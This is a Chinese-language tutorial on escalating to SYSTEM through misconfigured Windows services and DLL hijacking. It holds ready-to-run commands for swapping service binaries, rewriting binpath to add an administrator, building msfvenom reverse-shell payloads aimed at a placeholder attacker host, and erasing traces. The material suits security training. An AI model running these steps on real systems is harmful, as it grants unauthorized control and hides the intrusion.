## 學習目標

- 理解 Windows 服務的 Binary Path / ACL / Unquoted Path 三種主要提權面。
- 能用 sc / icacls / accesschk 找出可利用的服務設定。
- 會修改服務 Binary Path 並重啟服務取得 SYSTEM shell。
- 知道 DLL Hijacking 的觸發條件與執行方式。

---

## 理論基礎：Windows 服務提權

Windows 服務以 SYSTEM 或其他高權帳號身份執行。如果你能控制服務「要執行什麼程式」，你就能讓 SYSTEM 執行你的代碼。

三種主要攻擊面：

| 攻擊類型 | 條件 | 原理 |
|---------|------|------|
| Insecure Service Binary | 服務 EXE 的 ACL 允許低權使用者寫入 | 替換 EXE → 服務重啟時執行 |
| Weak Service Permissions | 服務 SCM 設定允許低權使用者修改 | 改 Binary Path → 重啟服務 |
| Unquoted Service Path | 服務路徑有空格且無引號 | 在空格前的目錄放惡意 EXE |

## 工具一：accesschk.exe（Sysinternals）

```cmd
:: 找所有服務中，普通使用者可以修改的（最常用）
accesschk.exe /accepteula -uwcqv "Everyone" *
:: /accepteula → 自動接受授權條款（第一次執行必須）
:: -u          → 不顯示錯誤
:: -w          → 只顯示有寫入權限的
:: -c          → 查服務（SCM 物件）
:: -q          → 安靜模式（不顯示標頭）
:: -v          → 顯示詳細權限
:: "Everyone"  → 查這個群組的權限（也可用 "BUILTIN\Users" / 當前使用者名）

:: 查特定服務的權限
accesschk.exe /accepteula -ucqv SERVICE_NAME
:: 輸出中找 SERVICE_CHANGE_CONFIG → 可以改服務設定

:: 查服務 EXE 的檔案 ACL
accesschk.exe /accepteula -uwq "Everyone" "C:\Path\To\Service.exe"
:: -w → 有寫入權限才顯示
```

## 攻擊一：Insecure Service Binary（替換 EXE）

```cmd
:: Step 1：找服務 EXE 的路徑
sc qc SERVICE_NAME
:: qc = query config
:: 找 BINARY_PATH_NAME

:: Step 2：確認 ACL（用 icacls）
icacls "C:\Path\To\service.exe"
:: 找 BUILTIN\Users:(F) 或 Everyone:(F)
:: (F) = Full Control
:: (M) = Modify
:: (W) = Write

:: Step 3：備份原始 EXE（可選）
copy "C:\Path\To\service.exe" "C:\Path\To\service.exe.bak"

:: Step 4：上傳/建立惡意 EXE
:: 用 msfvenom 生成 payload
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o evil.exe
:: 上傳後替換
copy evil.exe "C:\Path\To\service.exe"

:: Step 5：重啟服務（觸發執行）
net stop SERVICE_NAME && net start SERVICE_NAME
:: 或如果沒有 stop/start 權限，等機器重啟，或找其他觸發方式

:: 更簡單的 payload：直接加使用者到管理員群組
:: 用 msfvenom -p windows/x64/exec CMD="net localgroup Administrators MYUSER /add" -f exe -o adduser.exe
```

## 攻擊二：Weak Service Permissions（修改 Binary Path）

```cmd
:: Step 1：確認有 SERVICE_CHANGE_CONFIG 權限
accesschk.exe /accepteula -ucqv SERVICE_NAME
:: 找輸出中有：RW BUILTIN\Users 或 RW Everyone

:: Step 2：看現在的設定
sc qc SERVICE_NAME

:: Step 3：修改 Binary Path 為你的 payload（直接執行 cmd 加管理員）
sc config SERVICE_NAME binpath= "cmd.exe /c net localgroup Administrators MYUSER /add"
:: binpath=  → 等號後面有空格是刻意的（sc 的語法）
:: "..."     → 整個指令要用引號括起來（否則空格會截斷）

:: Step 4：重啟服務
net stop SERVICE_NAME
net start SERVICE_NAME
:: 服務啟動後執行 cmd 加管理員（服務會「失敗」但指令已執行）

:: Step 5：確認結果
net localgroup Administrators

:: 恢復原始設定（清除痕跡）
sc config SERVICE_NAME binpath= "C:\Original\Path\service.exe"
```

## 攻擊三：Unquoted Service Path（路徑未加引號）

### 理論

如果服務路徑是 `C:\Program Files\My Service\service.exe`（有空格且無引號），Windows 會依序嘗試：
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

只要你能在 1 或 2 的目錄放一個 EXE，服務啟動時就會先執行你的 EXE。

```cmd
:: 找所有 Unquoted Service Path
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v \"\"
:: 過濾掉 Windows 系統服務和已加引號的路徑
:: 剩下的就是未加引號且路徑有空格的服務

:: 更精確的 PowerShell 版
Get-WmiObject -Class Win32_Service | Where-Object {
  $_.PathName -notmatch '"' -and 
  $_.PathName -notmatch "C:\\Windows"
} | Select Name, PathName, StartMode

:: 確認路徑中哪個目錄可以寫入
icacls "C:\Program Files\My Service"
:: 找 BUILTIN\Users:(W) 或 (M)

:: 放惡意 EXE 到空格前的路徑
:: 例如路徑是 C:\Program Files\My Service\service.exe
:: 放 C:\Program.exe（如果 C:\ 根目錄可寫）
:: 或 C:\Program Files\My.exe（如果 Program Files 可寫）
copy evil.exe "C:\Program Files\My.exe"

:: 重啟服務
net stop "My Service" && net start "My Service"
```

## 攻擊四：DLL Hijacking

### 理論

如果程式在載入 DLL 時按照 DLL 搜尋順序（先找應用程式目錄，再找系統目錄），且應用程式目錄可寫入，就可以放一個同名的惡意 DLL。

```cmd
:: 找哪個 DLL 找不到（Procmon 觀察）
:: 過濾條件：PATH NOT FOUND + .dll 副檔名

:: 確認 DLL 搜尋路徑（程式所在目錄是否可寫）
icacls "C:\Path\To\Application"

:: 生成惡意 DLL（msfvenom）
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o hijack.dll
:: 改名成目標程式在找的 DLL 名稱
copy hijack.dll "C:\Path\To\Application\missing.dll"

:: 重啟程式或服務觸發 DLL 載入
net stop SERVICE && net start SERVICE

:: PowerUp 自動找 DLL Hijacking 機會
Import-Module .\PowerUp.ps1
Find-ProcessDLLHijack
Find-PathDLLHijack
```

## PowerUp 自動化

```powershell
Import-Module .\PowerUp.ps1

# 一鍵找所有服務相關提權
Invoke-AllChecks

# 只看服務相關
Get-UnquotedService            # Unquoted Path
Get-ModifiableService          # 弱 SCM 權限
Get-ModifiableServiceFile      # 可替換的服務 EXE
```

## 速查表

```cmd
:: 找可寫入的服務（SCM 權限）
accesschk.exe /accepteula -uwcqv "Everyone" *

:: 改 Binary Path 為加管理員指令
sc config SERVICE_NAME binpath= "cmd /c net localgroup Administrators MYUSER /add"
net stop SERVICE_NAME && net start SERVICE_NAME

:: 找 Unquoted Service Path
wmic service get name,pathname | findstr /i /v "Windows" | findstr /i /v "\"\""

:: 找可替換的服務 EXE
icacls "C:\Path\To\service.exe" | findstr "Everyone\|BUILTIN\Users"
```
